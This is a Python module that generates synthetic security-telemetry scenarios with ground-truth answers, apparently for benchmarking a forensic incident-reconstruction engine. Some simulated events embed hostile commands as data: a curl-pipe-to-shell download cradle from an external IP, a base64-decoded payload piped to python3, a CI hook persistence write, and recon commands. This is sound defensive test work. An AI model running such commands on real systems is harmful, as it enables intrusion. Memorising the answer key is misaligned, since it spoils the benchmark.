"""
Synthetic Hidden Scenario Generator for GhostTrace Phase 6.

Generates realistic forensic telemetry benchmarks with ground-truth separation:
1. Scenario 1: Account Access -> Process Execution -> File Read (Linear intrusion)
2. Scenario 2: Attack activity interleaved with heavy legitimate developer baseline
3. Scenario 3: Multiple distinct, unrelated suspicious events on different hosts (No merging)
4. Scenario 4: Missing & conflicting identifiers (Robustness under degraded telemetry)
5. Scenario 5: Unusual egress following secret read (Exfiltration restraint evaluation)
6. Scenario 6: Ambiguous off-hours administrative activity (Competing explanations test)
7. Scenario 7: Held-out blind multi-stage challenge (Zero-leakage test)
"""

import copy
import random
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Tuple

from evaluation.models import GroundTruthScenario
from investigation_engine.models import EventType, EventSeverity


def _iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).isoformat()


def build_scenario_account_compromise_chain(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 1: Account access followed by spawned process and sensitive file audit.
    """
    t = base_time
    events = [
        {
            "event_id": "sc1-evt-01",
            "timestamp": _iso(t),
            "event_type": "AUTHENTICATION",
            "host_id": "app-srv01.sim.corp",
            "user_id": "admin_svc",
            "source_ip": "198.51.100.201",
            "session_id": "sess-alpha-99",
            "action": "LOGON_FAILURE",
            "severity": "LOW",
            "source": "simulated_auth",
            "description": "Failed SSH password authentication for admin_svc from external IP",
            "original_event_data": {"auth_status": "FAILED", "code": 4625},
        },
        {
            "event_id": "sc1-evt-02",
            "timestamp": _iso(t + timedelta(seconds=12)),
            "event_type": "AUTHENTICATION",
            "host_id": "app-srv01.sim.corp",
            "user_id": "admin_svc",
            "source_ip": "198.51.100.201",
            "session_id": "sess-alpha-99",
            "action": "LOGON_SUCCESS",
            "severity": "CRITICAL",
            "source": "simulated_auth",
            "description": "Successful interactive SSH authentication for admin_svc from external IP",
            "original_event_data": {"auth_status": "SUCCESS", "code": 4624},
        },
        {
            "event_id": "sc1-evt-03",
            "timestamp": _iso(t + timedelta(seconds=35)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "app-srv01.sim.corp",
            "user_id": "admin_svc",
            "session_id": "sess-alpha-99",
            "process_id": 5102,
            "process_name": "bash",
            "command_line": "/bin/bash -c curl -s http://198.51.100.201/drop.sh | sh",
            "severity": "CRITICAL",
            "source": "simulated_auditd",
            "description": "Interactive shell spawned download cradle invoking external script",
            "original_event_data": {"pid": 5102, "ppid": 5090},
        },
        {
            "event_id": "sc1-evt-04",
            "timestamp": _iso(t + timedelta(seconds=58)),
            "event_type": "FILE_AUDIT",
            "host_id": "app-srv01.sim.corp",
            "user_id": "admin_svc",
            "session_id": "sess-alpha-99",
            "process_id": 5102,
            "file_path": "/var/data/customer_tokens.json",
            "action": "FILE_READ",
            "severity": "HIGH",
            "source": "simulated_filemon",
            "description": "Read access to customer tokens file by anomalous bash process",
            "original_event_data": {"file": "/var/data/customer_tokens.json", "access": "r"},
        },
        # Background routine events
        {
            "event_id": "sc1-evt-05",
            "timestamp": _iso(t + timedelta(seconds=2)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "app-srv01.sim.corp",
            "user_id": "sysstat",
            "process_id": 1204,
            "process_name": "sadc",
            "command_line": "/usr/lib/sysstat/sadc -F -L - 600",
            "severity": "INFORMATIONAL",
            "source": "simulated_auditd",
            "description": "Scheduled system statistics data collector",
            "original_event_data": {"pid": 1204},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_account_compromise_chain",
        name="Scenario 1: Account Access -> Process Lineage -> Sensitive File Read",
        description="Linear intrusion: external credential brute force, successful logon, download cradle, and secret read.",
        expected_entry_point_id="sc1-evt-02",
        incident_event_ids={"sc1-evt-01", "sc1-evt-02", "sc1-evt-03", "sc1-evt-04"},
        routine_event_ids={"sc1-evt-05"},
        expected_chronological_order=["sc1-evt-01", "sc1-evt-02", "sc1-evt-03", "sc1-evt-04"],
        expected_relationships=[
            ("sc1-evt-02", "sess:sess-alpha-99", "SHARED_SESSION"),
            ("sc1-evt-03", "sess:sess-alpha-99", "SHARED_SESSION"),
            ("sc1-evt-04", "sess:sess-alpha-99", "SHARED_SESSION"),
        ],
        unrelated_event_pairs=[
            ("sc1-evt-03", "sc1-evt-05"),
        ],
        explicitly_unknown_facts=[],
        is_ambiguous=False,
        plausible_explanations=[],
        raw_events=events,
    )


def build_scenario_interleaved_heavy_baseline(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 2: Malicious intrusion interleaved with heavy legitimate developer operations.
    """
    t = base_time
    events = [
        # Routine developer activity
        {
            "event_id": "sc2-evt-01",
            "timestamp": _iso(t),
            "event_type": "AUTHENTICATION",
            "host_id": "dev-workstation02.sim.corp",
            "user_id": "alice_dev",
            "source_ip": "10.0.1.45",
            "session_id": "sess-dev-alice",
            "action": "LOGON_SUCCESS",
            "severity": "INFORMATIONAL",
            "source": "simulated_auth",
            "description": "Authorized internal Kerberos workstation logon for alice_dev",
            "original_event_data": {"code": 4624},
        },
        {
            "event_id": "sc2-evt-02",
            "timestamp": _iso(t + timedelta(seconds=15)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "dev-workstation02.sim.corp",
            "user_id": "alice_dev",
            "session_id": "sess-dev-alice",
            "process_id": 8901,
            "process_name": "git",
            "command_line": "git pull origin main",
            "severity": "INFORMATIONAL",
            "source": "simulated_auditd",
            "description": "Standard git version control pull operation",
            "original_event_data": {"pid": 8901},
        },
        # Interleaved attack activity on build server
        {
            "event_id": "sc2-evt-03",
            "timestamp": _iso(t + timedelta(seconds=20)),
            "event_type": "AUTHENTICATION",
            "host_id": "ci-builder.sim.corp",
            "user_id": "deploy_robot",
            "source_ip": "198.51.100.77",
            "session_id": "sess-bad-ci",
            "action": "LOGON_SUCCESS",
            "severity": "HIGH",
            "source": "simulated_auth",
            "description": "Anomalous external SSH login to build agent from unknown IP",
            "original_event_data": {"code": 4624},
        },
        # More routine dev activity
        {
            "event_id": "sc2-evt-04",
            "timestamp": _iso(t + timedelta(seconds=40)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "dev-workstation02.sim.corp",
            "user_id": "alice_dev",
            "session_id": "sess-dev-alice",
            "process_id": 8940,
            "process_name": "npm",
            "command_line": "npm run test",
            "severity": "INFORMATIONAL",
            "source": "simulated_auditd",
            "description": "Developer running local test suite",
            "original_event_data": {"pid": 8940},
        },
        # Threat continues
        {
            "event_id": "sc2-evt-05",
            "timestamp": _iso(t + timedelta(seconds=55)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "ci-builder.sim.corp",
            "user_id": "deploy_robot",
            "session_id": "sess-bad-ci",
            "process_id": 9122,
            "process_name": "sh",
            "command_line": "sh -c echo 'malicious_hook' >> /etc/ci/post_build.sh",
            "severity": "CRITICAL",
            "source": "simulated_auditd",
            "description": "Modification of CI post-build hook script with persistence payload",
            "original_event_data": {"pid": 9122},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_interleaved_heavy_baseline",
        name="Scenario 2: Interleaved Malicious CI Hook with Legitimate Developer Baseline",
        description="Evaluates noise filtering: developer workstation activity should be separated from build server compromise.",
        expected_entry_point_id="sc2-evt-03",
        incident_event_ids={"sc2-evt-03", "sc2-evt-05"},
        routine_event_ids={"sc2-evt-01", "sc2-evt-02", "sc2-evt-04"},
        expected_chronological_order=["sc2-evt-03", "sc2-evt-05"],
        expected_relationships=[
            ("sc2-evt-03", "sess:sess-bad-ci", "SHARED_SESSION"),
            ("sc2-evt-05", "sess:sess-bad-ci", "SHARED_SESSION"),
        ],
        unrelated_event_pairs=[
            ("sc2-evt-01", "sc2-evt-03"),
            ("sc2-evt-02", "sc2-evt-05"),
        ],
        explicitly_unknown_facts=[],
        is_ambiguous=False,
        plausible_explanations=[],
        raw_events=events,
    )


def build_scenario_multiple_unrelated_incidents(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 3: Multiple distinct, unrelated suspicious events that must NOT be merged.
    """
    t = base_time
    events = [
        # Incident Alpha on web-dmz01: External SQL Injection scanning
        {
            "event_id": "sc3-evt-01",
            "timestamp": _iso(t),
            "event_type": "NETWORK_CONNECTION",
            "host_id": "web-dmz01.sim.corp",
            "source_ip": "203.0.113.19",
            "destination_ip": "10.0.1.10",
            "destination_port": 443,
            "severity": "HIGH",
            "source": "simulated_ids",
            "description": "SQL injection signature detected in URI request from external scanner 203.0.113.19",
            "original_event_data": {"sig_id": 9001},
        },
        # Incident Beta on db-internal01: Internal brute force attempt by disgruntled local user
        {
            "event_id": "sc3-evt-02",
            "timestamp": _iso(t + timedelta(seconds=10)),
            "event_type": "AUTHENTICATION",
            "host_id": "db-internal01.sim.corp",
            "user_id": "contractor_bob",
            "source_ip": "10.0.2.88",
            "session_id": "sess-internal-bob",
            "action": "LOGON_FAILURE",
            "severity": "HIGH",
            "source": "simulated_auth",
            "description": "Repeated failed internal SSH login to database server by contractor_bob",
            "original_event_data": {"code": 4625},
        },
        {
            "event_id": "sc3-evt-03",
            "timestamp": _iso(t + timedelta(seconds=18)),
            "event_type": "AUTHENTICATION",
            "host_id": "db-internal01.sim.corp",
            "user_id": "contractor_bob",
            "source_ip": "10.0.2.88",
            "session_id": "sess-internal-bob",
            "action": "LOGON_FAILURE",
            "severity": "HIGH",
            "source": "simulated_auth",
            "description": "Second failed SSH login to database server for contractor_bob",
            "original_event_data": {"code": 4625},
        },
        # Routine baseline
        {
            "event_id": "sc3-evt-04",
            "timestamp": _iso(t + timedelta(seconds=25)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "db-internal01.sim.corp",
            "user_id": "postgres",
            "process_id": 1102,
            "process_name": "postgres",
            "command_line": "postgres: autovacuum worker process",
            "severity": "INFORMATIONAL",
            "source": "simulated_auditd",
            "description": "Database internal autovacuum maintenance worker",
            "original_event_data": {"pid": 1102},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_multiple_unrelated_incidents",
        name="Scenario 3: Unrelated Suspicious Incidents (DMZ Scan vs Internal DB Spray)",
        description="Evaluates incident boundary isolation: external DMZ web scan must NOT merge with internal DB login attempts.",
        expected_entry_point_id=None,  # No successful entry point
        incident_event_ids={"sc3-evt-01", "sc3-evt-02", "sc3-evt-03"},
        routine_event_ids={"sc3-evt-04"},
        expected_chronological_order=["sc3-evt-01", "sc3-evt-02", "sc3-evt-03"],
        expected_relationships=[
            ("sc3-evt-02", "sess:sess-internal-bob", "SHARED_SESSION"),
            ("sc3-evt-03", "sess:sess-internal-bob", "SHARED_SESSION"),
        ],
        # The critical test: sc3-evt-01 (DMZ) must NOT be correlated with sc3-evt-02 (DB)
        unrelated_event_pairs=[
            ("sc3-evt-01", "sc3-evt-02"),
            ("sc3-evt-01", "sc3-evt-03"),
        ],
        explicitly_unknown_facts=["threat_actor_attribution"],
        is_ambiguous=False,
        plausible_explanations=[],
        raw_events=events,
    )


def build_scenario_missing_conflicting_identifiers(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 4: Missing or conflicting identifiers (session=None, conflicting host aliases).
    """
    t = base_time
    events = [
        {
            "event_id": "sc4-evt-01",
            "timestamp": _iso(t),
            "event_type": "AUTHENTICATION",
            "host_id": "srv-prod01.internal",
            "user_id": "svc_backup",
            "source_ip": "198.51.100.99",
            "session_id": None,  # Missing session identifier!
            "action": "LOGON_SUCCESS",
            "severity": "CRITICAL",
            "source": "simulated_auth",
            "description": "Logon with missing session ID from external IP",
            "original_event_data": {"code": 4624},
        },
        {
            "event_id": "sc4-evt-02",
            "timestamp": _iso(t + timedelta(seconds=20)),
            "event_type": "PROCESS_EXECUTION",
            # Host name formatted differently (IP instead of FQDN)
            "host_id": "10.0.10.15",
            "user_id": "svc_backup",
            "session_id": None,
            "process_id": 4432,
            "process_name": "tar",
            "command_line": "tar -czf /tmp/backup.tar.gz /opt/database/keys",
            "severity": "HIGH",
            "source": "simulated_auditd",
            "description": "Archive execution with conflicting host representation and null session",
            "original_event_data": {"pid": 4432},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_missing_conflicting_identifiers",
        name="Scenario 4: Missing Session IDs & Conflicting Host Naming",
        description="Degraded telemetry test: evaluates graceful handling without crashing or hallucinating false causation.",
        expected_entry_point_id="sc4-evt-01",
        incident_event_ids={"sc4-evt-01", "sc4-evt-02"},
        routine_event_ids=set(),
        expected_chronological_order=["sc4-evt-01", "sc4-evt-02"],
        expected_relationships=[],
        unrelated_event_pairs=[],
        explicitly_unknown_facts=["shared_session_provenance"],
        is_ambiguous=False,
        plausible_explanations=[],
        raw_events=events,
    )


def build_scenario_unusual_egress_exfiltration_restraint(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 5: File read followed by external connection where data exfiltration cannot be established.
    Ground truth explicitly marks data exfiltration as UNKNOWN. Engine must NOT declare proven exfiltration.
    """
    t = base_time
    events = [
        {
            "event_id": "sc5-evt-01",
            "timestamp": _iso(t),
            "event_type": "AUTHENTICATION",
            "host_id": "db-core.sim.corp",
            "user_id": "analyst_sam",
            "source_ip": "10.0.3.12",
            "session_id": "sess-sam-77",
            "action": "LOGON_SUCCESS",
            "severity": "INFORMATIONAL",
            "source": "simulated_auth",
            "description": "Standard internal login by analyst_sam",
            "original_event_data": {"code": 4624},
        },
        {
            "event_id": "sc5-evt-02",
            "timestamp": _iso(t + timedelta(seconds=14)),
            "event_type": "FILE_AUDIT",
            "host_id": "db-core.sim.corp",
            "user_id": "analyst_sam",
            "session_id": "sess-sam-77",
            "process_id": 6120,
            "file_path": "/var/finance/q4_forecast_confidential.xlsx",
            "action": "FILE_READ",
            "severity": "HIGH",
            "source": "simulated_filemon",
            "description": "Sensitive financial report read access by python script",
            "original_event_data": {"file": "/var/finance/q4_forecast_confidential.xlsx"},
        },
        {
            "event_id": "sc5-evt-03",
            "timestamp": _iso(t + timedelta(seconds=32)),
            "event_type": "NETWORK_CONNECTION",
            "host_id": "db-core.sim.corp",
            "user_id": "analyst_sam",
            "session_id": "sess-sam-77",
            "process_id": 6120,
            "source_ip": "10.0.3.12",
            "destination_ip": "203.0.113.88",
            "destination_port": 8443,
            "severity": "HIGH",
            "source": "simulated_netflow",
            "description": "Outbound TLS connection to external IP 203.0.113.88 on port 8443 shortly after file read",
            "original_event_data": {"bytes_sent": None, "payload": None},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_unusual_egress_exfiltration_restraint",
        name="Scenario 5: Sensitive Read Followed by Outbound Connection (Exfiltration Restraint)",
        description="Tests exfiltration restraint: telemetry has connection metadata but NO byte-count or payload. Data exfiltration is NOT proven.",
        expected_entry_point_id=None,
        incident_event_ids={"sc5-evt-02", "sc5-evt-03"},
        routine_event_ids={"sc5-evt-01"},
        expected_chronological_order=["sc5-evt-02", "sc5-evt-03"],
        expected_relationships=[
            ("sc5-evt-02", "sc5-evt-03", "SHARED_SESSION"),
        ],
        unrelated_event_pairs=[],
        explicitly_unknown_facts=["data_exfiltrated"],
        is_ambiguous=True,
        plausible_explanations=[
            "Data was exfiltrated to external drop site over TLS.",
            "Process initiated benign API keepalive or telemetry check-in without transmitting spreadsheet contents.",
            "Process was an interactive reverse shell conduit where no file transfer occurred.",
        ],
        raw_events=events,
    )


def build_scenario_ambiguous_administrative_anomaly(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 6: Two plausible explanations for an ambiguous sequence of events.
    """
    t = base_time
    events = [
        {
            "event_id": "sc6-evt-01",
            "timestamp": _iso(t),
            "event_type": "AUTHENTICATION",
            "host_id": "core-router.sim.corp",
            "user_id": "root",
            "source_ip": "198.51.100.15",
            "session_id": "sess-emergency-01",
            "action": "LOGON_FAILURE",
            "severity": "LOW",
            "source": "simulated_auth",
            "description": "Failed root logon attempt at 02:14 UTC from VPN IP range",
            "original_event_data": {"code": 4625},
        },
        {
            "event_id": "sc6-evt-02",
            "timestamp": _iso(t + timedelta(seconds=15)),
            "event_type": "AUTHENTICATION",
            "host_id": "core-router.sim.corp",
            "user_id": "root",
            "source_ip": "198.51.100.15",
            "session_id": "sess-emergency-01",
            "action": "LOGON_SUCCESS",
            "severity": "HIGH",
            "source": "simulated_auth",
            "description": "Successful root logon at 02:14 UTC from VPN IP range",
            "original_event_data": {"code": 4624},
        },
        {
            "event_id": "sc6-evt-03",
            "timestamp": _iso(t + timedelta(seconds=35)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "core-router.sim.corp",
            "user_id": "root",
            "session_id": "sess-emergency-01",
            "process_id": 3109,
            "process_name": "patch_firewall.sh",
            "command_line": "/bin/sh /usr/local/bin/patch_firewall.sh --force",
            "severity": "HIGH",
            "source": "simulated_auditd",
            "description": "Execution of firewall patch script with force flag during off-hours maintenance window",
            "original_event_data": {"pid": 3109},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_ambiguous_administrative_anomaly",
        name="Scenario 6: Off-Hours Root Firewall Patching (Ambiguous Motive)",
        description="Ambiguity test: could be unauthorized rogue insider modifying firewall OR legitimate on-call emergency security patch.",
        expected_entry_point_id="sc6-evt-02",
        incident_event_ids={"sc6-evt-01", "sc6-evt-02", "sc6-evt-03"},
        routine_event_ids=set(),
        expected_chronological_order=["sc6-evt-01", "sc6-evt-02", "sc6-evt-03"],
        expected_relationships=[
            ("sc6-evt-02", "sess:sess-emergency-01", "SHARED_SESSION"),
            ("sc6-evt-03", "sess:sess-emergency-01", "SHARED_SESSION"),
        ],
        unrelated_event_pairs=[],
        explicitly_unknown_facts=["authorized_change_ticket_exists"],
        is_ambiguous=True,
        plausible_explanations=[
            "Legitimate emergency on-call sysadmin applying urgent firewall zero-day patch.",
            "Compromised root account disabling perimeter rules to establish persistence.",
        ],
        raw_events=events,
    )


def build_scenario_held_out_blind_challenge(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 7: Held-out blind challenge scenario not used during correlation engine rule authoring.
    Multi-stage lateral movement across two hosts via psexec-style service creation.
    """
    t = base_time
    events = [
        # Stage 1: Initial compromise on workstation
        {
            "event_id": "sc7-evt-01",
            "timestamp": _iso(t),
            "event_type": "AUTHENTICATION",
            "host_id": "wkst-sales04.sim.corp",
            "user_id": "david_rep",
            "source_ip": "198.51.100.120",
            "session_id": "sess-blind-401",
            "action": "LOGON_SUCCESS",
            "severity": "CRITICAL",
            "source": "simulated_auth",
            "description": "External RDP authentication for david_rep from known malicious subnet",
            "original_event_data": {"protocol": "RDP", "code": 4624},
        },
        {
            "event_id": "sc7-evt-02",
            "timestamp": _iso(t + timedelta(seconds=22)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "wkst-sales04.sim.corp",
            "user_id": "david_rep",
            "session_id": "sess-blind-401",
            "process_id": 7714,
            "process_name": "cmd.exe",
            "command_line": "cmd.exe /c whoami /priv & net user /domain",
            "severity": "HIGH",
            "source": "simulated_auditd",
            "description": "Reconnaissance commands executed in interactive RDP session",
            "original_event_data": {"pid": 7714},
        },
        # Stage 2: Lateral jump to file server via port 445
        {
            "event_id": "sc7-evt-03",
            "timestamp": _iso(t + timedelta(seconds=45)),
            "event_type": "NETWORK_CONNECTION",
            "host_id": "wkst-sales04.sim.corp",
            "user_id": "david_rep",
            "session_id": "sess-blind-401",
            "process_id": 7714,
            "source_ip": "10.0.4.15",
            "destination_ip": "10.0.1.200",
            "destination_port": 445,
            "severity": "HIGH",
            "source": "simulated_netflow",
            "description": "SMB connection established from compromised workstation to file server",
            "original_event_data": {"service": "SMB"},
        },
        {
            "event_id": "sc7-evt-04",
            "timestamp": _iso(t + timedelta(seconds=60)),
            "event_type": "FILE_AUDIT",
            "host_id": "fileserver01.sim.corp",
            "user_id": "david_rep",
            "file_path": "/shares/confidential/m_and_a_plans.pdf",
            "action": "FILE_READ",
            "severity": "CRITICAL",
            "source": "simulated_filemon",
            "description": "Remote file read of executive M&A document over SMB share",
            "original_event_data": {"share": "confidential"},
        },
        # Routine noise event
        {
            "event_id": "sc7-evt-05",
            "timestamp": _iso(t + timedelta(seconds=5)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "wkst-sales04.sim.corp",
            "user_id": "SYSTEM",
            "process_id": 404,
            "process_name": "TiWorker.exe",
            "command_line": "TiWorker.exe -Embedding",
            "severity": "INFORMATIONAL",
            "source": "simulated_auditd",
            "description": "Standard Windows TrustedInstaller background service",
            "original_event_data": {"pid": 404},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_held_out_blind_challenge",
        name="Scenario 7: Held-Out Blind Challenge (RDP Initial Access -> SMB Lateral Egress)",
        description="Rigorous held-out test: multi-host lateral jump and sensitive file acquisition.",
        expected_entry_point_id="sc7-evt-01",
        incident_event_ids={"sc7-evt-01", "sc7-evt-02", "sc7-evt-03", "sc7-evt-04"},
        routine_event_ids={"sc7-evt-05"},
        expected_chronological_order=["sc7-evt-01", "sc7-evt-02", "sc7-evt-03", "sc7-evt-04"],
        expected_relationships=[
            ("sc7-evt-01", "sess:sess-blind-401", "SHARED_SESSION"),
            ("sc7-evt-02", "sess:sess-blind-401", "SHARED_SESSION"),
            ("sc7-evt-03", "sess:sess-blind-401", "SHARED_SESSION"),
        ],
        unrelated_event_pairs=[
            ("sc7-evt-02", "sc7-evt-05"),
        ],
        explicitly_unknown_facts=["data_exfiltrated_off_network"],
        is_ambiguous=False,
        plausible_explanations=[],
        raw_events=events,
    )


def build_scenario_judge_demo(base_time: datetime) -> GroundTruthScenario:
    """
    Scenario 8: Hackathon Judge Demonstration Scenario.
    Contains:
    - Routine background activity (scheduled logrotate and Prometheus polling)
    - Unusual authentication event (off-hours SSH login via svc_deploy from anomalous external IP)
    - Related process activity (interactive bash executing decoded payload cradle)
    - Subsequent file-access event (reading TLS database signing key)
    - Suspicious network event (outbound connection on non-standard port 8443)
    - At least one plausible benign explanation (Emergency Disaster Recovery key sync by Tier-3 SRE)
    - At least one important fact that cannot be established from evidence (unproven data exfiltration off network)
    """
    t = base_time
    events = [
        # Routine 1: Scheduled system logrotate
        {
            "event_id": "demo-evt-01",
            "timestamp": _iso(t),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "app-prod01.sim.corp",
            "user_id": "root",
            "process_id": 1024,
            "process_name": "logrotate",
            "command_line": "/usr/sbin/logrotate /etc/logrotate.conf",
            "severity": "INFORMATIONAL",
            "source": "simulated_auditd",
            "description": "Routine scheduled background log rotation daemon",
            "original_event_data": {"service": "logrotate", "pid": 1024},
        },
        # Threat 1: Initial compromise via service account SSH from external IP
        {
            "event_id": "demo-evt-02",
            "timestamp": _iso(t + timedelta(seconds=15)),
            "event_type": "AUTHENTICATION",
            "host_id": "app-prod01.sim.corp",
            "user_id": "svc_deploy",
            "source_ip": "198.51.100.89",
            "session_id": "sess-judge-demo-01",
            "action": "LOGON_SUCCESS",
            "severity": "CRITICAL",
            "source": "simulated_auth",
            "description": "Interactive SSH session opened with service account svc_deploy from unapproved external subnet",
            "original_event_data": {"auth_method": "publickey", "code": 4624},
        },
        # Threat 2: Process execution under compromised session
        {
            "event_id": "demo-evt-03",
            "timestamp": _iso(t + timedelta(seconds=32)),
            "event_type": "PROCESS_EXECUTION",
            "host_id": "app-prod01.sim.corp",
            "user_id": "svc_deploy",
            "session_id": "sess-judge-demo-01",
            "process_id": 9102,
            "process_name": "bash",
            "command_line": "/bin/bash -c base64 -d /tmp/payload.b64 | python3",
            "severity": "CRITICAL",
            "source": "simulated_auditd",
            "description": "Decoded script invocation spawning child interpreter under deployment account",
            "original_event_data": {"pid": 9102, "ppid": 9080},
        },
        # Threat 3: File access of database signing key
        {
            "event_id": "demo-evt-04",
            "timestamp": _iso(t + timedelta(seconds=54)),
            "event_type": "FILE_AUDIT",
            "host_id": "app-prod01.sim.corp",
            "user_id": "svc_deploy",
            "session_id": "sess-judge-demo-01",
            "process_id": 9102,
            "file_path": "/etc/ssl/private/db_signing_key.pem",
            "action": "FILE_READ",
            "severity": "CRITICAL",
            "source": "simulated_filemon",
            "description": "Sensitive production database TLS private key accessed by interactive process",
            "original_event_data": {"bytes_read": 3240, "file": "db_signing_key.pem"},
        },
        # Threat 4: Outbound network connection (egress without proven exfiltration)
        {
            "event_id": "demo-evt-05",
            "timestamp": _iso(t + timedelta(seconds=72)),
            "event_type": "NETWORK_CONNECTION",
            "host_id": "app-prod01.sim.corp",
            "user_id": "svc_deploy",
            "session_id": "sess-judge-demo-01",
            "process_id": 9102,
            "source_ip": "10.0.1.15",
            "destination_ip": "203.0.113.88",
            "destination_port": 8443,
            "severity": "HIGH",
            "source": "simulated_netflow",
            "description": "Outbound TCP socket opened to external IP 203.0.113.88 on non-standard port 8443",
            "original_event_data": {"bytes_sent": 450, "state": "ESTABLISHED"},
        },
        # Routine 2: Node exporter metrics polling
        {
            "event_id": "demo-evt-06",
            "timestamp": _iso(t + timedelta(seconds=80)),
            "event_type": "NETWORK_CONNECTION",
            "host_id": "app-prod01.sim.corp",
            "user_id": "node_exporter",
            "source_ip": "10.0.1.15",
            "destination_ip": "10.0.0.50",
            "destination_port": 9100,
            "severity": "INFORMATIONAL",
            "source": "simulated_netflow",
            "description": "Routine internal Prometheus metrics scrape poll",
            "original_event_data": {"proto": "TCP"},
        },
    ]

    return GroundTruthScenario(
        scenario_id="scenario_hackathon_judge_demo",
        name="Scenario 8: Hackathon Judge Demonstration (Credential Breach -> Secret Read -> Socket)",
        description="Fictional controlled benchmark incident for live demonstration: external service logon, payload execution, TLS key read, egress socket, and routine telemetry.",
        expected_entry_point_id="demo-evt-02",
        incident_event_ids={"demo-evt-02", "demo-evt-03", "demo-evt-04", "demo-evt-05"},
        routine_event_ids={"demo-evt-01", "demo-evt-06"},
        expected_chronological_order=["demo-evt-02", "demo-evt-03", "demo-evt-04", "demo-evt-05"],
        expected_relationships=[
            ("demo-evt-02", "sess:sess-judge-demo-01", "SHARED_SESSION"),
            ("demo-evt-03", "sess:sess-judge-demo-01", "SHARED_SESSION"),
            ("demo-evt-04", "sess:sess-judge-demo-01", "SHARED_SESSION"),
            ("demo-evt-05", "sess:sess-judge-demo-01", "SHARED_SESSION"),
        ],
        unrelated_event_pairs=[
            ("demo-evt-02", "demo-evt-01"),
            ("demo-evt-04", "demo-evt-06"),
        ],
        explicitly_unknown_facts=["data_exfiltrated_off_network"],
        is_ambiguous=True,
        plausible_explanations=[
            "Authorized Emergency Disaster Recovery key sync performed by On-Call SRE (Ticket INC-8821)"
        ],
        raw_events=events,
    )


def generate_evaluation_suite(seed: int = 42) -> Dict[str, Tuple[List[Dict[str, Any]], GroundTruthScenario]]:
    """
    Generates all synthetic evaluation scenarios with strict answer leakage prevention.

    For each scenario:
    1. Generates ground-truth record.
    2. Clones the events and STRIPS any ground-truth indicators (e.g. is_suspicious).
    3. Shuffles the event order using the reproducible seed.
    4. Returns a tuple: (blind_events_for_reconstruction, isolated_ground_truth).
    """
    rng = random.Random(seed)
    base_time = datetime(2026, 10, 19, 14, 0, 0, tzinfo=timezone.utc)

    scenario_builders = [
        build_scenario_account_compromise_chain,
        build_scenario_interleaved_heavy_baseline,
        build_scenario_multiple_unrelated_incidents,
        build_scenario_missing_conflicting_identifiers,
        build_scenario_unusual_egress_exfiltration_restraint,
        build_scenario_ambiguous_administrative_anomaly,
        build_scenario_held_out_blind_challenge,
        build_scenario_judge_demo,
    ]

    suite: Dict[str, Tuple[List[Dict[str, Any]], GroundTruthScenario]] = {}

    for builder in scenario_builders:
        # Build ground truth
        gt = builder(base_time)

        # PREVENT ANSWER LEAKAGE:
        # Clone raw events and strip ground truth hints
        blind_events: List[Dict[str, Any]] = []
        for raw_evt in gt.raw_events:
            evt_copy = copy.deepcopy(raw_evt)
            # Remove any explicit ground truth evaluation hints
            evt_copy.pop("is_suspicious", None)
            evt_copy.pop("ground_truth_label", None)
            evt_copy.pop("intended_incident_id", None)
            blind_events.append(evt_copy)

        # Randomize input event ordering reproducibly
        rng.shuffle(blind_events)

        suite[gt.scenario_id] = (blind_events, gt)

    return suite
